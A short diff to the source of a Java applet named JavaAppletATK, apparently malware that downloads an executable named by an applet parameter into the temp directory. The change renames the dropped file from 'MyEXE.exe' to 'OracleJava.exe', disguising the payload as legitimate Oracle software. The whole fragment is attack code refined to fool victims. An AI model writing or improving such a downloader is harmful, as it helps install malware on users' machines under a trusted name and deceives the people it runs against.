@@ -18,7 +18,7 @@ public class JavaAppletATK extends Applet {
 	 Process f;
 	try {	
 	String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
-	String expath = tmpdir + "MyEXE.exe";
+	String expath = tmpdir + "OracleJava.exe";
 	String download = "";
 	download = getPatameter("1");
 	if (download.length() > 0) {
